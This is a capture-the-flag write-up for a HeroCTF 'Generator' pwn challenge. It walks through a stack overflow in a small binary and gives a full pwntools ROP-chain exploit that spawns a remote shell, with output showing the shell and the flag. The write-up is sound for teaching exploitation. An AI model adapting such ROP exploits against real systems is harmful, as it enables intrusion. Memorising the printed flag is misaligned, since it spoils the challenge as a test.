# Generator

### Category

Pwn

### Description

Login and get the flag!

**Host** : pwn.heroctf.fr<br>
**Port** : 8000

Format : **Hero{flag}**<br>
Author : **SoEasY**

### Files

 - [Generator](Generator)

### Write up

Let's start this challenge by making a checksec on the binary:
```bash
$ checksec ./Generator
[*] '/home/soeasy/GitHub/HeroCTF_v4/Pwn/Generator/Generator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
We can see that there is no PIE and no stack canary: the perfect setup to ROP. Let's open the binary in IDA and look at the main:
```c
int __cdecl main(int argc, const char **argv, const char **envp){
  unsigned int v3; // eax
  char s[5]; // [rsp+7h] [rbp-9h] BYREF
  int i; // [rsp+Ch] [rbp-4h]

  v3 = time(0LL);
  srand(v3);

  for ( i = 0; i <= 6; ++i )
    random_str[i] = rand() % 94 + 33;

  random_str_last_byte = 0;

  printf("Random string generated: %s\n", random_str);
  printf("Are you satisfied by this application ? (yes/no) ");
  fflush(_bss_start);
  fgets(s, 100, stdin);

  if ( strncmp(s, "yes", 3uLL) ){
    printf("Sorry to read this, we will do our best to give you a better user experience...%c", 10LL);
    fflush(_bss_start);
    exit(1);
  }

  printf("Nice ! Rate us on the playstore: %s\n", playstore_link);
  fflush(_bss_start);
  return 0;
}
```
So we can see that a random 7-bytes-long string is generated and placed in a global variable in the .bss called `random_str`.
Then, an input is asked to the user on 100 bytes to fit in a char[5] --> evident buffer overflow here, but the trick is that it has to start with "yes" without what `exit(1)` will be called and the main return will never be called.

Then, we can observe a symbol called `interesting`, let's see what's going on there:
```nasm
.text:0x401216     endbr64
.text:0x40121A     push    rbp
.text:0x40121B     mov     rbp, rsp
.text:0x40121E     xor     [rdi], rsi
.text:0x401221     retn

.text:0x401222     pop     rdi
.text:0x401223     pop     rsi
.text:0x401224     pop     rdx
.text:0x401225     retn

.text:0x401226     xchg    rax, rdx
.text:0x401228     retn

.text:0x401229     syscall
```

Nice ! we've got everything here to make our ROPchain that will execute `execve("/bin/sh")`. This is the plan:
- xor `random_str` with a value to have "/bin/sh"
- set rax to 0x3b (SYS_EXECVE)
- set rdi to &random_str
- set rsi to 0
- set rdx to 0
- syscall

--> Note that the final payload's length must be < 100 bytes.
```py
from pwn import *

r = remote("pwn.heroctf.fr", 8000)
#r = process("./Generator")

xor_ptr_rdi_rsi = p64(0x40121e)
pop_rdi_rsi_rdx = p64(0x401222)
pop_rsi_rdx		= p64(0x401223)
xchg_rax_rdx	= p64(0x401226)
syscall			= p64(0x401229)
random_str		= p64(0x404090)

string = r.recvuntil(b"\n").split(b" ")[-1].strip()
print(f"[+] Leaked string: {string}")

# [::-1] because the string will be xored in little endian in the program
xor_val = int(binascii.hexlify((string + b"\x00")[::-1]), 16) ^ int(binascii.hexlify(b"/bin/sh\x00"[::-1]), 16)
print(f"[+] XOR value to have \"/bin/sh\": {hex(xor_val)}")

rop = b"yes"
rop += b"A" * 14

rop += pop_rdi_rsi_rdx
rop += random_str
rop += p64(xor_val)
rop += p64(0x3b)

rop += xchg_rax_rdx
rop += xor_ptr_rdi_rsi

rop += pop_rsi_rdx
rop += p64(0)
rop += p64(0)

rop += syscall

# pause()
log.success(f"ROPchain length: {len(rop)}")
r.sendline(rop)
r.interactive()
```
Result:
```bash
$ python3 solve.py 
[+] Opening connection to pwn.heroctf.fr on port 8000: Done
[+] Leaked string: b'Py1_EGk'
[+] XOR value to have "/bin/sh": 0x3346a31581b7f
[+] ROPchain length: 97
[*] Switching to interactive mode
Are you satisfied by this application ? (yes/no) Nice ! Rate us on the playstore: https://bit.ly/384qugO
$ id
uid=1000(player) gid=1001(player) groups=1001(player),1000(ctf)
$ cat flag.txt
Hero{Pr3tty_c00l_x64_R0P_1ntr0_r1ght???}
```


### Flag

```
Hero{Pr3tty_c00l_x64_R0P_1ntr0_r1ght???}
```
